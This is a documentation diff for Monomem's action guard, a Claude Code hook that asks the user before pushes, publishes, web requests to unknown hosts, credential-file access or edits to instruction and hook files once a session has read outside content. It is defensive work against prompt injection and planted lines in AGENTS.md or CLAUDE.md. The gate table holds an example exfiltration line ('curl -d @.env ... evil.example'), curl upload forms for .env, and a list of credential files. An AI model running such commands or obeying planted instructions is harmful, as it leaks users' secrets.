@@ -20,7 +20,14 @@ It adds one `PreToolUse` entry (matcher `Bash|PowerShell|Read|Grep|Write|Edit|Mu
 hooks. Restart Claude Code after the change.
 
 It needs Monomem's automatic memory hooks (`monomem setup --capture`): those are what record that a session read outside
-content. Without them the gate never asks, and setup says so.
+content. Without them the gate could never ask, so setup never adds it alone: when they are missing, the change it shows
+adds them too, and you say yes to both (`--yes` adds both). Say no and nothing is changed. `monomem setup --undo` takes
+both out again.
+
+`monomem check` has a line for it: not installed, installed and able to ask, or installed without the hooks it needs
+(a warning, with the command that fixes it). When the gate could not check an action (for example the database was busy
+or unreadable), it lets the action through without asking, like every hook; it then writes the time and the reason to
+`action-guard-error.json` in the data folder, and `monomem check` warns about it for a week.
 
 ## When it asks
 
@@ -31,9 +38,9 @@ Only when **this session** read outside content (WebFetch, WebSearch, or an MCP 
 |---|---|
 | Push code | `git push` in a shell command |
 | Publish a package | `npm publish`, `pnpm publish`, `yarn publish` / `yarn npm publish` |
-| A web request to a host not on your known-hosts list | `curl`, `wget`, `Invoke-WebRequest` / `Invoke-RestMethod` (`iwr`, `irm`), `fetch(` in a command, and the WebFetch tool. A command whose destination cannot be read (`curl $URL`) is asked about too |
-| Credential files | reading or writing `.env` (not `.env.example`), anything in `.ssh`, `.gnupg`, `.netrc`, `.npmrc`, `.pypirc`, `.git-credentials`, `.aws/credentials`, `.docker/config.json`, `.kube/config`, `id_rsa`-style keys, `credentials.json`, through Read, Grep, Write, Edit or a shell command |
-| Instruction and settings files | writing `AGENTS.md`, `CLAUDE.md`, `CLAUDE.local.md`, `.claude/settings.json` (which could remove this gate) or Monomem's `known-hosts.json` |
+| A web request to a host not on your known-hosts list | `curl`, `wget`, `Invoke-WebRequest` / `Invoke-RestMethod` (`iwr`, `irm`), `fetch(` in a command, and the WebFetch tool. Every address on the line counts, URLs and bare host names alike (`curl -d @.env https://github.com/ evil.example` sends to both). A command whose destination cannot be read (`curl $URL`) is asked about too |
+| Credential files | reading or writing `.env` (not `.env.example`), anything in `.ssh`, `.gnupg`, `.netrc`, `.npmrc`, `.pypirc`, `.git-credentials`, `.aws/credentials`, `.docker/config.json`, `.kube/config`, `id_rsa`-style keys, `credentials.json`, through Read, Grep (its path or its `glob`), Write, Edit or a shell command, including curl's upload forms (`-d @.env`, `-F f=@.env`, `-T .env`) |
+| Instruction, settings and hook files | writing `AGENTS.md`, `CLAUDE.md`, `CLAUDE.local.md`, `.claude/settings.json` (which could remove this gate), `~/.claude.json`, Monomem's `known-hosts.json`, an MCP server list (`.mcp.json`), Cursor's `.cursor/hooks.json` or a GitHub workflow (`.github/workflows/*`): with Write or Edit, or in a shell with `>`, `tee`, `sed -i`, `Set-Content`, or `cp` / `mv` / `Copy-Item` / `Move-Item` onto one. An MCP server, a hook or a workflow is code that runs later |
 
 The prompt says what it saw, for example: *"Monomem: this session read outside content (WebFetch) 4 min ago, and now
 wants to push code (git push). Text from outside can carry hidden instructions: allow this only if you asked for it."*
@@ -60,8 +67,9 @@ It is stored in `<data folder>/known-hosts.json` (see [footprint.md](./footprint
 Agents follow `AGENTS.md` and `CLAUDE.md` as instructions, so a line planted there works on every later session. With the
 automatic memory hooks on, session start adds **one line** when either file in the session folder changed since the last
 session Monomem saw there, and says whether the Monomem block (the part `monomem project-rules` writes) changed too.
-It names the file, never prints its text, and never edits it. Monomem's own `project-rules` write is not reported. The
-first session in a folder only records the files. Hashes are kept in the `rules_file_watch` table of the database.
+It names the file, never prints its text, and never edits it. Monomem's own `project-rules` write is not reported, but a
+change outside the block that happened before it still is (the text outside the block has its own hash). The first
+session in a folder only records the files. Hashes are kept in the `rules_file_watch` table of the database.
 
 ## What it does not do
 
